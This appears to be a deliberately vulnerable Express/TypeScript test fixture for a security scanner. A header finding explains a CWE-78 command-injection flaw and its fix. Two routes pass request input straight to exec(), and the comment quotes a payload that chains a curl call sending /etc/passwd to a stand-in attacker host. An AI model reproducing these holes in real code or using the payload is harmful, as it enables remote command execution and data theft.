// [frensense]
// observation: User-controlled input from req.body.script is passed to exec()
//              via shell string interpolation, allowing arbitrary command execution.
// impact: An attacker can execute any OS command by sending a crafted script
//         value such as "ls; curl https://attacker.com/exfil?d=$(cat /etc/passwd)".
// improvement: Replace exec() with execFile() and pass arguments as an array,
//              or validate script against a strict allowlist before execution.
//              Never interpolate user input into a shell string.
// cwe: CWE-78
// cvss: 9.8
// severity: Critical
// owasp: A03:2021
// runtime_probe: cmdi

import { exec } from "child_process";
import express from "express";
import { Router } from "express";

const router = Router();

async function resolveScript(scriptName: string): Promise<string> {
    // Pretends to resolve a user-provided script name
    return `/scripts/${scriptName}`;
}

router.post("/api/jobs/run", async (req: express.Request, res: express.Response) => {
    const { script, args } = req.body as { script: string; args: string };
    const resolved = await resolveScript(script);
    exec(`${resolved} ${args}`, (err, stdout, stderr) => {
        if (err) {
            return res.status(500).json({ error: stderr });
        }
        res.json({ output: stdout });
    });
});

router.post("/api/admin/command", (req: express.Request, res: express.Response) => {
    const cmd = req.body.cmd as string;
    exec(cmd, (error, stdout) => {
        res.json({ result: stdout, error: error?.message });
    });
});

export default router;
